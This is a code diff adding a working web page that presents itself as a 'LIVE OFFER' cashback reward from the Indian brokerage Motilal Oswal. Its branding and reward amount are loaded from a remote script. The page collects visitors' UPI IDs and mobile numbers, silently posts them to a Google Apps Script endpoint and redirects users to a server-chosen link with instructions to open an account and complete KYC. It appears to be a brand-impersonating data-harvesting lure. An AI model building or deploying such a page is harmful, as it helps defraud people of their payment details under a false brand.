@@ -1,1 +1,87 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Exclusive Reward Offer</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { background-color: #090d16; color: #f1f5f9; min-height: 100vh; font-family: sans-serif; }
+    .neon-btn { background: linear-gradient(135deg, #6366f1, #a855f7, #ec4899); }
+    .reward-box { background: #1e1b4b; border: 1px solid #ec4899; }
+  </style>
+</head>
+<body class="flex justify-center items-center p-4">
+  <div class="w-full max-w-md bg-[#0f172a] rounded-3xl p-6 border border-slate-800 shadow-2xl">
+    <div class="flex flex-col items-center text-center">
+      <div id="brandLogo" class="w-16 h-16 rounded-2xl bg-purple-600 flex items-center justify-center text-white text-2xl font-bold mb-3 border border-purple-400">MO</div>
+      <span class="text-xs bg-emerald-950 text-emerald-400 px-3 py-1 rounded-full border border-emerald-700">● LIVE OFFER</span>
+      <h1 id="brandName" class="text-2xl font-black mt-3 text-white">Motilal Oswal</h1>
+      <p class="text-xs text-slate-400 mt-1">Claim instant reward to your UPI</p>
+      
+      <div class="reward-box w-full rounded-2xl p-4 mt-4 text-center">
+        <span class="text-xs font-bold text-pink-400 uppercase">You Will Earn</span>
+        <div id="rewardAmount" class="text-3xl font-black text-white mt-1">₹150</div>
+      </div>
+    </div>
+
+    <form id="claimForm" class="mt-6 space-y-4">
+      <div>
+        <label class="text-xs font-bold text-purple-400 uppercase">Payment Details</label>
+        <input type="text" id="upiId" required placeholder="Enter Your UPI ID" class="w-full bg-[#111827] border border-slate-700 rounded-xl p-3.5 mt-1 text-white text-sm focus:outline-none focus:border-purple-500">
+      </div>
+      <div>
+        <input type="tel" id="phoneNumber" required pattern="[6-9][0-9]{9}" maxlength="10" placeholder="Enter 10-Digit Mobile Number" class="w-full bg-[#111827] border border-slate-700 rounded-xl p-3.5 text-white text-sm focus:outline-none focus:border-purple-500">
+      </div>
+      <button type="submit" id="submitBtn" class="w-full neon-btn text-white font-bold p-4 rounded-xl text-base shadow-lg">
+        <span id="btnText">Claim Reward Now →</span>
+      </button>
+    </form>
+
+    <div class="mt-5 bg-slate-900 p-4 rounded-xl border border-slate-800 text-xs text-slate-300 space-y-2">
+      <p class="font-bold text-white mb-2">📌 Kaise Milega Reward:</p>
+      <p>1. Upar apna UPI ID aur number daal kar submit karein.</p>
+      <p>2. Agle page par usi number se account open karein.</p>
+      <p>3. KYC verify hote hi UPI me cashback credit ho jayega.</p>
+    </div>
+  </div>
+
+  <script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzxucdyqI8dflDUIYUarpd7OHVzM0fUe2OG0e-_e6YBJMqxN3G6q3H32kUNLVrVNin-lg/exec";
+    let activeLink = "https://google.com";
+
+    fetch(SCRIPT_URL + "?action=getOffer")
+      .then(res => res.json())
+      .then(data => {
+        if(data.name) document.getElementById('brandName').innerText = data.name;
+        if(data.reward) document.getElementById('rewardAmount').innerText = "₹" + data.reward;
+        if(data.logo) document.getElementById('brandLogo').innerText = data.logo;
+        if(data.link) activeLink = data.link;
+      }).catch(e => console.log(e));
+
+    document.getElementById('claimForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      document.getElementById('btnText').innerText = "Redirecting...";
+      document.getElementById('submitBtn').disabled = true;
+
+      const leadData = {
+        action: "saveLead",
+        offer: document.getElementById('brandName').innerText,
+        phone: document.getElementById('phoneNumber').value,
+        upi: document.getElementById('upiId').value,
+        date: new Date().toLocaleString()
+      };
+
+      fetch(SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(leadData)
+      });
+
+      setTimeout(() => { window.location.href = activeLink; }, 800);
+    });
+  </script>
+</body>
+</html>
 
